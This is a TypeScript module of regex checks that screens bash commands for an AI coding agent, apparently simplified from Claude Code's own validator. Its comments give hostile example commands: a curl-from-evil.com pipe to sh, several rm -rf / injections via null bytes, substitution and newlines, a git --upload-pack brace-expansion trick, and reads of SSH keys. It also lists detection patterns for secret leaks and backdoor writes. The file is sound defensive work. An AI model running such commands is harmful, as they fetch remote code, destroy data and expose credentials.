/**
 * Bash Security Analysis
 *
 * Simplified from Claude Code's bashSecurity.ts (2592 lines, 30+ validators).
 * Covers the top-10 highest-risk attack vectors with ~500 lines.
 *
 * Design:
 * - Each check is an independent, pure function
 * - Runs AFTER the existing SAFE_COMMANDS / DANGEROUS_COMMANDS lists in permissions.ts
 * - Safety-first: false positives are acceptable, false negatives are not
 * - No external dependencies (regex-only, no tree-sitter / shell-quote)
 */

// -- Public API --

export interface SecurityCheckResult {
  safe: boolean
  reason?: string
  /** Which check triggered (for debugging / logging) */
  checkId?: string
}

/**
 * Run all security checks on a bash command.
 * Returns the first failing check, or { safe: true } if all pass.
 */
export function analyzeCommand(command: string): SecurityCheckResult {
  for (const check of CHECKS) {
    const result = check(command)
    if (!result.safe) return result
  }
  return { safe: true }
}

// -- Types --

type SecurityCheck = (command: string) => SecurityCheckResult

// -- Check Registry --

const CHECKS: SecurityCheck[] = [
  checkControlCharacters,
  checkUnicodeWhitespace,
  checkCommandSubstitution,
  checkProcessSubstitution,
  checkIFSInjection,
  checkProcAccess,
  checkBraceExpansion,
  checkPipeToShell,
  checkDangerousRedirection,
  checkBackslashEscapedOperators,
  checkNewlineInjection,
]

// -- Helpers --

/**
 * Remove content inside quotes from a command string.
 * Returns only the unquoted portions (quoted content replaced with spaces).
 *
 * Handles:
 * - Single quotes: '...' (no escapes inside, per POSIX)
 * - Double quotes: "..." (backslash escapes \\ \" \$ \` \newline)
 * - Backslash escapes outside quotes
 *
 * This is intentionally conservative: on ambiguous input (e.g., unbalanced
 * quotes), it treats the rest as quoted (hidden), which is the safe direction
 * for security checks - we'd rather false-positive than miss an attack.
 */
function removeQuotedContent(command: string): string {
  let result = ''
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < command.length; i++) {
    const char = command[i]!

    if (escaped) {
      escaped = false
      // Outside quotes, the escaped char is part of unquoted content
      // but we replace it with a space to avoid false pattern matches
      // on the escaped character itself.
      if (!inSingleQuote && !inDoubleQuote) {
        result += ' '
      }
      continue
    }

    // Backslash is literal inside single quotes
    if (char === '\\' && !inSingleQuote) {
      escaped = true
      if (!inDoubleQuote) {
        result += ' ' // placeholder for the backslash itself
      }
      continue
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      result += ' ' // placeholder for quote char
      continue
    }

    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      result += ' ' // placeholder for quote char
      continue
    }

    if (inSingleQuote || inDoubleQuote) {
      result += ' ' // hide quoted content
    } else {
      result += char
    }
  }

  return result
}

/**
 * Check if a character at a given position is preceded by an odd number
 * of backslashes (i.e., it is escaped).
 */
function isEscapedAt(content: string, pos: number): boolean {
  let count = 0
  let i = pos - 1
  while (i >= 0 && content[i] === '\\') {
    count++
    i--
  }
  return count % 2 === 1
}

// -- Individual Checks --

/**
 * Check 1: Control Characters
 *
 * Detects ASCII control characters (0x00-0x08, 0x0B-0x0C, 0x0E-0x1F, 0x7F).
 * Excludes tab (0x09), newline (0x0A), carriage return (0x0D) which are
 * handled by other checks or are legitimate.
 *
 * Risk: Bash silently drops null bytes and ignores most control chars,
 * so an attacker can inject them to slip metacharacters past regex checks
 * while bash still executes the command (e.g., "echo safe\x00; rm -rf /").
 *
 * Ref: Claude Code CONTROL_CHARACTERS (check 17)
 */
// eslint-disable-next-line no-control-regex
const CONTROL_CHAR_RE = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/

function checkControlCharacters(command: string): SecurityCheckResult {
  if (CONTROL_CHAR_RE.test(command)) {
    return {
      safe: false,
      reason: 'Command contains non-printable control characters that could bypass security checks',
      checkId: 'control_characters',
    }
  }
  return { safe: true }
}

/**
 * Check 2: Unicode Whitespace / Zero-Width Characters
 *
 * Detects characters that look like spaces or are invisible but are NOT
 * treated as word separators by bash. This creates a visual mismatch:
 * the command looks harmless but executes differently.
 *
 * Ref: Claude Code UNICODE_WHITESPACE (check 18)
 */
// eslint-disable-next-line no-misleading-character-class
const UNICODE_WS_RE =
  /[\u00A0\u1680\u2000-\u200D\u2028\u2029\u202F\u205F\u3000\uFEFF]/

function checkUnicodeWhitespace(command: string): SecurityCheckResult {
  if (UNICODE_WS_RE.test(command)) {
    return {
      safe: false,
      reason: 'Command contains Unicode whitespace or zero-width characters that could disguise malicious content',
      checkId: 'unicode_whitespace',
    }
  }
  return { safe: true }
}

/**
 * Check 3: Command Substitution
 *
 * Detects $(...), backticks, and advanced ${...} parameter expansions.
 * Simple variable references like $VAR and ${VAR} (alphanumeric + underscore
 * only) are allowed.
 *
 * These execute arbitrary commands even inside double quotes:
 *   echo "$(rm -rf /)"   -- still executes rm
 *   echo `rm -rf /`      -- still executes rm
 *
 * Ref: Claude Code DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION (check 8)
 */
function checkCommandSubstitution(command: string): SecurityCheckResult {
  // We check the FULL command (not just unquoted content) because
  // command substitution executes even inside double quotes.
  // Single-quoted content is safe ($() is literal inside '...').

  // Walk the string, tracking only single-quote state
  let inSingleQuote = false
  let escaped = false

  for (let i = 0; i < command.length; i++) {
    const char = command[i]!

    if (escaped) {
      escaped = false
      continue
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }

    if (char === "'" && !inSingleQuote) {
      // Find closing single quote
      const close = command.indexOf("'", i + 1)
      if (close === -1) break // Unclosed quote — rest is quoted (safe direction)
      i = close // skip to closing quote
      continue
    }

    // $( — command substitution
    if (char === '$' && command[i + 1] === '(') {
      return {
        safe: false,
        reason: 'Command contains $() command substitution',
        checkId: 'command_substitution',
      }
    }

    // ${ — check if it's an advanced expansion or simple ${VAR}
    if (char === '$' && command[i + 1] === '{') {
      // Find closing }
      const close = command.indexOf('}', i + 2)
      if (close === -1) {
        return {
          safe: false,
          reason: 'Command contains unclosed ${} parameter expansion',
          checkId: 'command_substitution',
        }
      }
      const inner = command.slice(i + 2, close)
      // Allow simple ${VAR} — only alphanumeric and underscore
      if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(inner)) {
        return {
          safe: false,
          reason: 'Command contains advanced ${} parameter expansion',
          checkId: 'command_substitution',
        }
      }
      // Simple ${VAR} is fine, skip past it
      i = close
      continue
    }

    // $[ — legacy arithmetic expansion
    if (char === '$' && command[i + 1] === '[') {
      return {
        safe: false,
        reason: 'Command contains $[] legacy arithmetic expansion',
        checkId: 'command_substitution',
      }
    }

    // Backtick — command substitution
    if (char === '`') {
      return {
        safe: false,
        reason: 'Command contains backtick command substitution',
        checkId: 'command_substitution',
      }
    }
  }

  return { safe: true }
}

/**
 * Check 4: Process Substitution
 *
 * Detects <(...), >(...), and Zsh's =(...) which execute commands
 * and present their output as file descriptors.
 *
 * These are checked on the full command (not just unquoted) because
 * even inside double quotes, process substitution creates side effects.
 *
 * Ref: Claude Code COMMAND_SUBSTITUTION_PATTERNS (process substitution entries)
 */
function checkProcessSubstitution(command: string): SecurityCheckResult {
  const unquoted = removeQuotedContent(command)

  if (/<\(/.test(unquoted)) {
    return {
      safe: false,
      reason: 'Command contains <() process substitution',
      checkId: 'process_substitution',
    }
  }
  if (/>\(/.test(unquoted)) {
    return {
      safe: false,
      reason: 'Command contains >() process substitution',
      checkId: 'process_substitution',
    }
  }
  if (/=\(/.test(unquoted)) {
    return {
      safe: false,
      reason: 'Command contains =() Zsh process substitution',
      checkId: 'process_substitution',
    }
  }

  return { safe: true }
}

/**
 * Check 5: IFS Injection
 *
 * Detects usage of the IFS variable ($IFS, ${IFS}, ${...IFS...}, IFS=).
 * IFS controls word splitting in bash — modifying it can make a single
 * argument split into a command + args, bypassing allowlist checks.
 *
 * Checked on the original command (not unquoted) because $IFS inside
 * double quotes still expands (though it doesn't cause word splitting
 * in that context, the assignment IFS= does).
 *
 * Ref: Claude Code IFS_INJECTION (check 11)
 */
function checkIFSInjection(command: string): SecurityCheckResult {
  // $IFS or ${...IFS...} reference
  if (/\$IFS\b|\$\{[^}]*IFS/.test(command)) {
    return {
      safe: false,
      reason: 'Command references $IFS which could bypass security validation via word splitting manipulation',
      checkId: 'ifs_injection',
    }
  }

  // IFS= assignment (only when not inside quotes)
  const unquoted = removeQuotedContent(command)
  if (/\bIFS=/.test(unquoted)) {
    return {
      safe: false,
      reason: 'Command modifies IFS which could bypass security validation via word splitting manipulation',
      checkId: 'ifs_injection',
    }
  }

  return { safe: true }
}

/**
 * Check 6: /proc Access
 *
 * Blocks access to /proc/<pid>/environ and /proc/<pid>/cmdline which can
 * leak environment variables (API keys, tokens, secrets) and
 * command-line arguments of other processes.
 *
 * Checked on the original command because the path could be inside
 * quotes and still be accessed.
 *
 * Ref: Claude Code PROC_ENVIRON_ACCESS (check 13)
 */
function checkProcAccess(command: string): SecurityCheckResult {
  if (/\/proc\/.*\/environ/.test(command)) {
    return {
      safe: false,
      reason: 'Command accesses /proc/*/environ which could expose sensitive environment variables',
      checkId: 'proc_access',
    }
  }
  if (/\/proc\/.*\/cmdline/.test(command)) {
    return {
      safe: false,
      reason: 'Command accesses /proc/*/cmdline which could expose sensitive command arguments',
      checkId: 'proc_access',
    }
  }

  return { safe: true }
}

/**
 * Check 7: Brace Expansion
 *
 * Detects unquoted {a,b} and {1..10} patterns. Brace expansion in bash
 * generates multiple words from a single token, which can bypass
 * permission checks that see only one argument.
 *
 * Example attack:
 *   git ls-remote {--upload-pack="touch /tmp/pwned",test}
 *   Parser sees one arg, bash expands to: --upload-pack="touch /tmp/pwned" test
 *
 * We check on unquoted content because quotes suppress brace expansion.
 * Backslash-escaped braces (\{, \}) also don't expand.
 *
 * Ref: Claude Code BRACE_EXPANSION (check 16)
 */
function checkBraceExpansion(command: string): SecurityCheckResult {
  const unquoted = removeQuotedContent(command)

  // Scan for unescaped { characters
  for (let i = 0; i < unquoted.length; i++) {
    if (unquoted[i] !== '{') continue
    if (isEscapedAt(unquoted, i)) continue

    // Find the matching unescaped } with nesting support
    let depth = 1
    let matchingClose = -1
    for (let j = i + 1; j < unquoted.length; j++) {
      if (unquoted[j] === '{' && !isEscapedAt(unquoted, j)) {
        depth++
      } else if (unquoted[j] === '}' && !isEscapedAt(unquoted, j)) {
        depth--
        if (depth === 0) {
          matchingClose = j
          break
        }
      }
    }

    if (matchingClose === -1) continue

    // Check for comma or .. at the outermost level (brace expansion triggers)
    let innerDepth = 0
    for (let k = i + 1; k < matchingClose; k++) {
      const ch = unquoted[k]!
      if (ch === '{' && !isEscapedAt(unquoted, k)) {
        innerDepth++
      } else if (ch === '}' && !isEscapedAt(unquoted, k)) {
        innerDepth--
      } else if (innerDepth === 0) {
        if (ch === ',' || (ch === '.' && unquoted[k + 1] === '.')) {
          return {
            safe: false,
            reason: 'Command contains brace expansion ({a,b} or {1..n}) that could alter command parsing',
            checkId: 'brace_expansion',
          }
        }
      }
    }
  }

  // Defense-in-depth: check for mismatched brace counts (quoted brace attack)
  let openCount = 0
  let closeCount = 0
  for (let i = 0; i < unquoted.length; i++) {
    if (unquoted[i] === '{' && !isEscapedAt(unquoted, i)) openCount++
    if (unquoted[i] === '}' && !isEscapedAt(unquoted, i)) closeCount++
  }
  if (openCount > 0 && closeCount > openCount) {
    return {
      safe: false,
      reason: 'Command has mismatched braces after quote stripping, indicating possible brace expansion obfuscation',
      checkId: 'brace_expansion',
    }
  }

  return { safe: true }
}

/**
 * Check 8: Pipe to Shell
 *
 * Detects piping output to shell interpreters, eval, source, or xargs
 * with shell execution. This is a classic remote code execution vector:
 *   curl https://evil.com/script.sh | sh
 *
 * Checked on unquoted content to avoid false positives inside strings.
 *
 * Ref: Claude Code DANGEROUS_PATTERNS (pipe-to-shell subset)
 */
function checkPipeToShell(command: string): SecurityCheckResult {
  const unquoted = removeQuotedContent(command)

  // | sh, | bash, | zsh, | /bin/sh, | /bin/bash, etc.
  const pipeToShellRe = /\|\s*(?:\/\w[\w/]*\/)?(sh|bash|zsh|dash|ksh|fish)\b/
  if (pipeToShellRe.test(unquoted)) {
    return {
      safe: false,
      reason: 'Command pipes output to a shell interpreter',
      checkId: 'pipe_to_shell',
    }
  }

  // | eval, | source
  if (/\|\s*(?:eval|source)\b/.test(unquoted)) {
    return {
      safe: false,
      reason: 'Command pipes output to eval/source',
      checkId: 'pipe_to_shell',
    }
  }

  // | xargs sh, | xargs bash, etc.
  if (/\|\s*xargs\s+(?:\/\w[\w/]*\/)?(sh|bash|zsh|dash|ksh)\b/.test(unquoted)) {
    return {
      safe: false,
      reason: 'Command pipes output to xargs with shell execution',
      checkId: 'pipe_to_shell',
    }
  }

  return { safe: true }
}

/**
 * Check 9: Dangerous Redirection
 *
 * Detects output redirection (> or >>) to sensitive system paths.
 * Writing to these locations can:
 * - Modify system config (/etc/*)
 * - Plant SSH backdoors (~/.ssh/*)
 * - Inject persistent shell backdoors (~/.bashrc, ~/.profile, ~/.zshrc)
 *
 * Safe redirections (> /dev/null, > /tmp/*) are explicitly allowed.
 *
 * Ref: Claude Code DANGEROUS_PATTERNS_OUTPUT_REDIRECTION (check 10)
 */
function checkDangerousRedirection(command: string): SecurityCheckResult {
  const unquoted = removeQuotedContent(command)

  // Match > or >> followed by a path
  const redirectMatches = unquoted.matchAll(/>{1,2}\s*(\S+)/g)

  for (const match of redirectMatches) {
    const target = match[1]!

    // Allow safe targets
    if (target === '/dev/null' || target.startsWith('/dev/null')) continue
    if (target.startsWith('/tmp/') || target.startsWith('/tmp')) continue

    // Block sensitive targets
    const dangerousTargets = [
      /^\/etc\//,            // System configuration
      /^~\/\.ssh\//,         // SSH keys/config
      /^~\/\.bashrc$/,       // Shell init (bash)
      /^~\/\.bash_profile$/, // Shell init (bash)
      /^~\/\.profile$/,      // Shell init (POSIX)
      /^~\/\.zshrc$/,        // Shell init (zsh)
      /^~\/\.zprofile$/,     // Shell init (zsh)
      /^~\/\.zshenv$/,       // Shell init (zsh)
      /^~\/\.config\//,      // User config directory
      /^\/usr\/local\/bin\//, // Writable bin directory
    ]

    for (const dangerousRe of dangerousTargets) {
      if (dangerousRe.test(target)) {
        return {
          safe: false,
          reason: `Command redirects output to sensitive path: ${target}`,
          checkId: 'dangerous_redirection',
        }
      }
    }
  }

  return { safe: true }
}

/**
 * Check 10: Backslash-Escaped Operators
 *
 * Detects backslash before shell operators (\;, \|, \&, \<, \>)
 * outside of quotes. This can hide command structure from regex-based
 * security checks while bash still interprets the operator.
 *
 * Example: `cat safe.txt \; echo ~/.ssh/id_rsa`
 * A naive check splitting on `;` wouldn't see the second command,
 * but bash executes it.
 *
 * Known false positive: `find . -exec cmd {} \;` — acceptable cost.
 *
 * Ref: Claude Code BACKSLASH_ESCAPED_OPERATORS (check 21)
 */
const SHELL_OPERATORS = new Set([';', '|', '&', '<', '>'])

function checkBackslashEscapedOperators(command: string): SecurityCheckResult {
  let inSingleQuote = false
  let inDoubleQuote = false

  for (let i = 0; i < command.length; i++) {
    const char = command[i]!

    // Handle backslash BEFORE quote toggles (critical for correctness)
    // Inside single quotes, backslash is literal — don't process
    if (char === '\\' && !inSingleQuote) {
      if (!inDoubleQuote) {
        const nextChar = command[i + 1]
        if (nextChar && SHELL_OPERATORS.has(nextChar)) {
          return {
            safe: false,
            reason: `Command contains backslash before shell operator (\\${nextChar}) which can hide command structure`,
            checkId: 'backslash_escaped_operators',
          }
        }
      }
      // Skip escaped character (both outside and inside double quotes)
      i++
      continue
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }
    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }
  }

  return { safe: true }
}

/**
 * Check 11: Newline Injection
 *
 * Detects literal newline characters in the command string.
 * In bash, a newline is equivalent to `;` — it separates commands.
 * An attacker can inject a newline to run additional commands:
 *   "echo safe\nrm -rf /"
 *
 * We allow backslash-newline line continuations at word boundaries
 * (common in long commands), but flag newlines that could separate commands.
 *
 * Ref: Claude Code NEWLINES (check 7)
 */
function checkNewlineInjection(command: string): SecurityCheckResult {
  // Work on unquoted content — newlines inside quotes are data, not separators
  const unquoted = removeQuotedContent(command)

  if (!/[\n\r]/.test(unquoted)) {
    return { safe: true }
  }

  // Check for carriage return (always suspicious outside quotes)
  if (/\r/.test(unquoted)) {
    return {
      safe: false,
      reason: 'Command contains carriage return which can cause parser differential attacks',
      checkId: 'newline_injection',
    }
  }

  // After removeQuotedContent, backslash-newline continuations (\<newline>)
  // are already replaced with spaces (the backslash consumes the next char).
  // So any remaining newline in `unquoted` is a real command separator.
  if (/\n\s*\S/.test(unquoted)) {
    return {
      safe: false,
      reason: 'Command contains newlines that could separate multiple commands',
      checkId: 'newline_injection',
    }
  }

  return { safe: true }
}
